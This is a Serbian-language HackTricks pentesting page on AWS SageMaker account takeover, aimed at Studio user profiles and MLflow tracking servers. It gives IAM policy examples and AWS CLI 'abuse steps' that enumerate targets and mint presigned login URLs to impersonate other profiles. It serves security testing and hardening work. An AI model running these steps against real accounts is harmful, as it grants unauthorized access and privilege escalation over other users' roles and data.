# AWS - SageMaker Neovlašćeni pristup

{{#include ../../../../banners/hacktricks-training.md}}

## SageMaker Studio - Preuzimanje naloga putem CreatePresignedDomainUrl (Imitacija bilo kojeg UserProfile)

### Opis
Identitet koji ima dozvolu da pozove `sagemaker:CreatePresignedDomainUrl` na ciljnom Studio `UserProfile` može da generiše login URL koji se autentifikuje direktno u SageMaker Studio kao taj profil. To pruža napadačevom pregledaču Studio sesiju koja nasleđuje dozvole profila (`ExecutionRole`) i potpuni pristup profilu koji je smešten na EFS-u (home) i aplikacijama. Nije potrebna `iam:PassRole` niti pristup console.

### Zahtevi
- SageMaker Studio `Domain` i ciljni `UserProfile` unutar njega.
- Napadački principal treba `sagemaker:CreatePresignedDomainUrl` na ciljnom `UserProfile` (na nivou resursa) ili `*`.

Minimalan primer policy-ja (ograničen na jedan UserProfile):
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sagemaker:CreatePresignedDomainUrl",
"Resource": "arn:aws:sagemaker:<region>:<account-id>:user-profile/<domain-id>/<user-profile-name>"
}
]
}
```
### Koraci zloupotrebe

1) Enumerate Studio Domain i UserProfiles koje možete ciljati
```bash
DOM=$(aws sagemaker list-domains --query 'Domains[0].DomainId' --output text)
aws sagemaker list-user-profiles --domain-id-equals $DOM
TARGET_USER=<UserProfileName>
```
2) Generišite presigned URL (važi ~5 minuta podrazumevano)
```bash
aws sagemaker create-presigned-domain-url \
--domain-id $DOM \
--user-profile-name $TARGET_USER \
--query AuthorizedUrl --output text
```
3) Otvorite vraćeni URL u pregledaču da biste se prijavili u Studio kao ciljani korisnik. U Jupyter terminalu unutar Studio proverite efektivni identitet:
```bash
aws sts get-caller-identity
```
Napomene:
- `--landing-uri` može biti izostavljen. Neke vrednosti (npr. `app:JupyterLab:/lab`) mogu biti odbijene u zavisnosti od varijante/verzije Studio-a; podrazumevana podešavanja obično preusmeravaju na početnu stranu Studio-a, a potom na Jupyter.
- Organizacione politike/ograničenja VPC endpointa i dalje mogu blokirati mrežni pristup; izdavanje tokena ne zahteva prijavu u konzolu ili `iam:PassRole`.

### Uticaj
- Bočno kretanje i eskalacija privilegija preuzimanjem bilo kog Studio `UserProfile` čiji ARN je dozvoljen, nasleđujući njegov `ExecutionRole` i datotečni sistem/aplikacije.

### Dokazi (iz kontrolisanog testa)
- Sa samo `sagemaker:CreatePresignedDomainUrl` na ciljnom `UserProfile`, uloga napadača je uspešno vratila `AuthorizedUrl` poput:
```
https://studio-d-xxxxxxxxxxxx.studio.<region>.sagemaker.aws/auth?token=eyJhbGciOi...
```
- Direktan HTTP zahtev vraća preusmerenje (HTTP 302) na Studio, potvrđujući da je URL važeći i aktivan do isteka.

## SageMaker MLflow Tracking Server - ATO putem CreatePresignedMlflowTrackingServerUrl

### Opis
Identitet sa dozvolom da pozove `sagemaker:CreatePresignedMlflowTrackingServerUrl` za ciljanu SageMaker MLflow Tracking Server može kreirati jednokratni presigned URL koji se direktno autentifikuje u managed MLflow UI za taj server. Ovo daje isti nivo pristupa koji bi legitimni korisnik imao serveru (pregled/kreiranje eksperimenata i pokretanja (runs), i preuzimanje/postavljanje artefakata u S3 skladištu artefakata servera) bez pristupa konzoli ili `iam:PassRole`.

### Zahtevi
- SageMaker MLflow Tracking Server u nalogu/regiji i njegovo ime.
- Napadački principal mora imati `sagemaker:CreatePresignedMlflowTrackingServerUrl` na ciljnom MLflow Tracking Server resursu (ili `*`).

Minimalan primer politike (ograničen na jedan Tracking Server):
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sagemaker:CreatePresignedMlflowTrackingServerUrl",
"Resource": "arn:aws:sagemaker:<region>:<account-id>:mlflow-tracking-server/<tracking-server-name>"
}
]
}
```
### Koraci zloupotrebe

1) Enumerate MLflow Tracking Servers koje možete ciljati i izaberite jedno ime
```bash
aws sagemaker list-mlflow-tracking-servers \
--query 'TrackingServerSummaries[].{Name:TrackingServerName,Status:TrackingServerStatus}'
TS_NAME=<tracking-server-name>
```
2) Generiši presigned MLflow UI URL (važi kratko vreme)
```bash
aws sagemaker create-presigned-mlflow-tracking-server-url \
--tracking-server-name "$TS_NAME" \
--expires-in-seconds 300 \
--session-expiration-duration-in-seconds 1800 \
--query AuthorizedUrl --output text
```
3) Otvorite vraćeni URL u pregledaču da pristupite MLflow UI kao autentifikovani korisnik za taj Tracking Server.

Napomene:
- Tracking Server mora biti u stanju spremnosti (npr., `Created/Active`). Ako je još uvek `Creating`, poziv će biti odbijen.
- The presigned URL is single‑use and short‑lived; generate a new one when needed.

### Uticaj
- Direktan pristup upravljanom MLflow UI za ciljani Tracking Server, što omogućava pregled i izmenu experiments/runs i preuzimanje ili otpremanje artifacts uskladištenih u S3 artifact store konfigurisanom za server, u okviru dozvola koje nameće konfiguracija servera.

{{#include ../../../../banners/hacktricks-training.md}}
